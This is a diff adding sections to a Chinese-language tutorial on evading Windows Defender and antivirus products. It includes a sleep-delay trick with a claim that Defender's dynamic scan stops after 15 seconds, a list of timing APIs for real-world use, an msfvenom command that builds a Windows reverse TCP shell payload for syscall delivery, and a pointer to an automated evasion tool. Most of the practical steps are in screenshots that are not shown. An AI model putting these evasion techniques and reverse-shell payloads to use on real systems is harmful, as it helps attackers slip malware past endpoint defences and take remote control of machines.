@@ -228,9 +228,11 @@ Sleep 代码片段
 
 ![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210903112347.png)
 
-该defender为测试时的最新版本
+该defender为测试时的最新版本，defender动态扫描不会超过15s，如果延时超过15s可以一定程度上绕过windows defender
 
 ![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210903112454.png)
+
+在实战中，用以下的方法会更好些，sleep只是为了演示，GetTickCount、GetSystemTime、GetSystemTimeAsFileTime、QueryPerformanceCounter、timeGetTime
 
 ## 0x05.进程镂空
 
@@ -310,3 +312,26 @@ https://www.jsjiami.com/javascriptobfuscator.html
 
 ![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210908171430.png)
 
+## 0x09 Syscall调用shellcode
+
+用Msf测试做一个加密
+
+msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.0.103 lport=5555 -f c -b \x00\x0a\x0d
+
+![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210921122630.png)
+
+把shellcode改一下
+
+![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210921122913.png)
+
+![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210921151031.png)
+
+## 0x10开源工具自动化免杀
+
+使用开源工具https://github.com/aniqfakhrul/Sharperner
+
+![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210921155153.png)
+
+利用Sharperner免杀绕过
+
+![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210921155403.png)
